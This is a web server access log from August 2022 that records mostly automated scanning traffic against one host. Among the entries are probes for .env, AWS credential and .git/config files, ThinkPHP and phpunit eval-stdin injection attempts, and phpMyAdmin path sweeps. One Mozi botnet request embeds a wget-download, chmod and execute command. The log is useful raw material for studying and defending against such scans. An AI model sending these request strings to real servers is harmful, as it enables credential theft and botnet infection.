185.7.214.117 - - [12/Aug/2022:19:40:45 -0500] "GET /actuator/gateway/routes HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.21.216.169 - - [12/Aug/2022:19:41:28 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
50.113.73.84 - - [12/Aug/2022:19:47:17 -0500] "GET / HTTP/1.1" 301 232 "-" "-"
84.255.202.78 - - [12/Aug/2022:19:55:02 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
74.82.47.3 - - [12/Aug/2022:20:15:16 -0500] "GET / HTTP/1.1" 301 232 "-" "-"
74.82.47.3 - - [12/Aug/2022:20:17:17 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36"
74.82.47.59 - - [12/Aug/2022:20:20:10 -0500] "GET /favicon.ico HTTP/1.1" 301 243 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36"
103.207.37.98 - - [12/Aug/2022:20:21:20 -0500] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
103.207.37.98 - - [12/Aug/2022:20:21:21 -0500] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
167.94.138.118 - - [12/Aug/2022:20:45:12 -0500] "GET / HTTP/1.1" 301 232 "-" "-"
167.94.138.118 - - [12/Aug/2022:20:45:12 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.118 - - [12/Aug/2022:20:45:12 -0500] "PRI * HTTP/2.0" 400 226 "-" "-"
185.254.196.223 - - [12/Aug/2022:21:25:42 -0500] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [12/Aug/2022:21:25:42 -0500] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.104.138.168 - - [12/Aug/2022:21:29:21 -0500] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
20.104.138.168 - - [12/Aug/2022:21:29:21 -0500] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
20.104.138.168 - - [12/Aug/2022:21:29:26 -0500] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 282 "-" "python-requests/2.28.1"
109.237.103.9 - - [12/Aug/2022:21:53:14 -0500] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [12/Aug/2022:21:53:14 -0500] "\x16\x03\x01\x01D\x01" 400 226 "-" "-"
109.237.103.9 - - [12/Aug/2022:21:53:14 -0500] "POST /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [12/Aug/2022:21:53:14 -0500] "GET /.aws/credentials HTTP/1.1" 301 248 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [12/Aug/2022:21:53:15 -0500] "POST /.aws/credentials HTTP/1.1" 301 248 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [12/Aug/2022:21:53:15 -0500] "GET /.aws/config HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [12/Aug/2022:21:53:15 -0500] "POST /.aws/config HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [12/Aug/2022:21:53:16 -0500] "GET /aws/credentials HTTP/1.1" 301 247 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [12/Aug/2022:21:53:16 -0500] "POST /aws/credentials HTTP/1.1" 301 247 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [12/Aug/2022:21:53:16 -0500] "GET /credentials HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [12/Aug/2022:21:53:16 -0500] "POST /credentials HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.161.131.237 - - [12/Aug/2022:22:41:33 -0500] "-" 408 - "-" "-"
46.161.11.208 - - [12/Aug/2022:22:56:12 -0500] "GET / HTTP/1.0" 301 241 "http://skillscybersecurityok.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4096.0 Safari/537.36"
20.104.138.168 - - [12/Aug/2022:23:17:56 -0500] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
20.104.138.168 - - [12/Aug/2022:23:17:57 -0500] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
20.104.138.168 - - [12/Aug/2022:23:18:01 -0500] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 282 "-" "python-requests/2.28.1"
143.198.174.30 - - [12/Aug/2022:23:24:48 -0500] "GET /config/getuser?index=0 HTTP/1.1" 301 254 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
94.102.61.10 - - [12/Aug/2022:23:32:15 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
2001:470:1:c84::11 - - [12/Aug/2022:23:47:18 -0500] "GET / HTTP/1.1" 400 226 "-" "-"
95.161.131.237 - - [12/Aug/2022:23:55:38 -0500] "GET / HTTP/1.1" 301 232 "-" "Linux Gnu (cow)"
185.254.196.223 - - [13/Aug/2022:00:25:49 -0500] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [13/Aug/2022:00:25:49 -0500] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.161.131.237 - - [13/Aug/2022:00:44:10 -0500] "GET / HTTP/1.1" 301 232 "-" "Linux Gnu (cow)"
62.233.50.179 - - [13/Aug/2022:00:50:00 -0500] "\x03" 400 226 "-" "-"
20.150.210.254 - - [13/Aug/2022:01:00:08 -0500] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.150.210.254 - - [13/Aug/2022:01:00:08 -0500] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
106.75.130.112 - - [13/Aug/2022:01:23:31 -0500] "GET / HTTP/1.0" 301 232 "-" "-"
186.224.241.215 - - [13/Aug/2022:01:40:05 -0500] "GET / HTTP/1.1" 400 226 "-" "-"
185.196.220.70 - - [13/Aug/2022:02:11:19 -0500] "GET / HTTP/1.1" 301 232 "-" "Linux Gnu (cow)"
143.198.174.30 - - [13/Aug/2022:02:38:56 -0500] "GET /config/getuser?index=0 HTTP/1.1" 301 254 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
222.138.221.86 - - [13/Aug/2022:03:12:08 -0500] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 226 "-" "-"
185.254.196.223 - - [13/Aug/2022:03:25:25 -0500] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [13/Aug/2022:03:25:26 -0500] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
23.251.102.74 - - [13/Aug/2022:03:31:19 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.136.150.164 - - [13/Aug/2022:04:05:29 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.21.216.169 - - [13/Aug/2022:04:14:30 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
181.112.139.114 - - [13/Aug/2022:06:09:20 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
185.254.196.223 - - [13/Aug/2022:06:26:11 -0500] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [13/Aug/2022:06:26:12 -0500] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
65.109.12.206 - - [13/Aug/2022:06:30:06 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
65.109.12.206 - - [13/Aug/2022:06:30:51 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
185.7.214.117 - - [13/Aug/2022:07:15:56 -0500] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 282 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.7.214.117 - - [13/Aug/2022:07:34:03 -0500] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 282 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
171.22.30.52 - - [13/Aug/2022:07:46:32 -0500] "GET /.env HTTP/1.1" 301 236 "-" "Python/3.7 aiohttp/3.7.4.post0"
171.22.30.52 - - [13/Aug/2022:07:46:33 -0500] "POST / HTTP/1.1" 301 232 "-" "Python/3.7 aiohttp/3.7.4.post0"
109.205.213.8 - - [13/Aug/2022:08:15:08 -0500] "\x16\x03\x01" 400 226 "-" "-"
109.205.213.8 - - [13/Aug/2022:08:15:08 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"
185.196.220.70 - - [13/Aug/2022:08:19:06 -0500] "GET / HTTP/1.1" 301 232 "-" "Linux Gnu (cow)"
107.182.129.239 - - [13/Aug/2022:08:22:09 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
185.7.214.117 - - [13/Aug/2022:08:23:45 -0500] "GET /solr/admin/info/system?wt=json HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.7.214.117 - - [13/Aug/2022:08:47:15 -0500] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 301 356 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
116.179.32.66 - - [13/Aug/2022:09:09:12 -0500] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
185.254.196.223 - - [13/Aug/2022:09:26:14 -0500] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [13/Aug/2022:09:26:14 -0500] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
154.89.5.112 - - [13/Aug/2022:09:36:11 -0500] "GET / HTTP/1.0" 301 232 "-" "-"
185.7.214.117 - - [13/Aug/2022:09:56:41 -0500] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 301 300 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
2.57.122.100 - - [13/Aug/2022:10:02:36 -0500] "GET /.git/config HTTP/1.1" 301 243 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
185.7.214.117 - - [13/Aug/2022:10:06:02 -0500] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
109.237.103.123 - - [13/Aug/2022:10:17:49 -0500] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.123 - - [13/Aug/2022:10:17:49 -0500] "\x16\x03\x01\x01D\x01" 400 226 "-" "-"
109.237.103.123 - - [13/Aug/2022:10:17:49 -0500] "POST /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.123 - - [13/Aug/2022:10:17:49 -0500] "GET /.aws/credentials HTTP/1.1" 301 248 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.123 - - [13/Aug/2022:10:17:49 -0500] "POST /.aws/credentials HTTP/1.1" 301 248 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.123 - - [13/Aug/2022:10:17:50 -0500] "GET /.aws/config HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.123 - - [13/Aug/2022:10:17:50 -0500] "POST /.aws/config HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.123 - - [13/Aug/2022:10:17:50 -0500] "GET /aws/credentials HTTP/1.1" 301 247 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.123 - - [13/Aug/2022:10:17:51 -0500] "POST /aws/credentials HTTP/1.1" 301 247 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.123 - - [13/Aug/2022:10:17:51 -0500] "GET /credentials HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.123 - - [13/Aug/2022:10:17:51 -0500] "POST /credentials HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.123 - - [13/Aug/2022:10:17:51 -0500] "GET /.aws HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.123 - - [13/Aug/2022:10:17:52 -0500] "POST /.aws HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.123 - - [13/Aug/2022:10:17:52 -0500] "GET /public/.env HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.123 - - [13/Aug/2022:10:17:52 -0500] "POST /public/.env HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.123 - - [13/Aug/2022:10:17:53 -0500] "GET /public/.aws/credentials HTTP/1.1" 301 255 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.123 - - [13/Aug/2022:10:17:53 -0500] "POST /public/.aws/credentials HTTP/1.1" 301 255 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.123 - - [13/Aug/2022:10:17:53 -0500] "GET /.aws/config HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.123 - - [13/Aug/2022:10:17:54 -0500] "POST /.aws/config HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.123 - - [13/Aug/2022:10:17:54 -0500] "GET /public/aws/credentials HTTP/1.1" 301 254 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.123 - - [13/Aug/2022:10:17:54 -0500] "POST /public/aws/credentials HTTP/1.1" 301 254 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.123 - - [13/Aug/2022:10:17:55 -0500] "GET /public/.aws HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.123 - - [13/Aug/2022:10:17:55 -0500] "POST /public/.aws HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.81.80.250 - - [13/Aug/2022:10:20:20 -0500] "CONNECT api.myip.la:443 HTTP/1.1" 301 232 "-" "Go-http-client/1.1"
159.223.26.31 - - [13/Aug/2022:10:24:35 -0500] "GET /.env HTTP/1.1" 301 236 "-" "libwww-perl/6.67"
185.7.214.117 - - [13/Aug/2022:11:00:00 -0500] "GET /console/ HTTP/1.1" 301 240 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.7.214.117 - - [13/Aug/2022:12:24:58 -0500] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.254.196.223 - - [13/Aug/2022:12:27:45 -0500] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [13/Aug/2022:12:27:45 -0500] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
212.117.30.221 - - [13/Aug/2022:12:28:42 -0500] "GET /phpmy/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221 - - [13/Aug/2022:12:28:43 -0500] "GET /mysql/web/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221 - - [13/Aug/2022:12:28:43 -0500] "GET /db/index.php?lang=en HTTP/1.1" 301 252 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221 - - [13/Aug/2022:12:28:43 -0500] "GET /mysql/mysqlmanager/index.php?lang=en HTTP/1.1" 301 268 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221 - - [13/Aug/2022:12:28:43 -0500] "GET /phpMyAdmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221 - - [13/Aug/2022:12:28:43 -0500] "GET /phpMyAdmin-4/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221 - - [13/Aug/2022:12:28:43 -0500] "GET /phpMyAdmin-4.9.7/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221 - - [13/Aug/2022:12:28:43 -0500] "GET /phpMyAdmin1/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221 - - [13/Aug/2022:12:28:43 -0500] "GET /admin/pma/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221 - - [13/Aug/2022:12:28:44 -0500] "GET /mysql/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221 - - [13/Aug/2022:12:28:44 -0500] "GET /phpMyAdmin5/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221 - - [13/Aug/2022:12:28:44 -0500] "GET /sql/sqlweb/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221 - - [13/Aug/2022:12:28:44 -0500] "GET /phpMyAdmin-3/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221 - - [13/Aug/2022:12:28:44 -0500] "GET /phpmyadmin2016/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221 - - [13/Aug/2022:12:28:44 -0500] "GET /db/websql/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221 - - [13/Aug/2022:12:28:44 -0500] "GET /phpmyadmin2019/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221 - - [13/Aug/2022:12:28:44 -0500] "GET /admin/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221 - - [13/Aug/2022:12:28:45 -0500] "GET /phpmyadmin2018/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221 - - [13/Aug/2022:12:28:45 -0500] "GET /_phpmyadmin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221 - - [13/Aug/2022:12:28:45 -0500] "GET /phpMyAdmin-5/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
212.117.30.221 - - [13/Aug/2022:12:28:45 -0500] "GET /sql/phpmanager/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
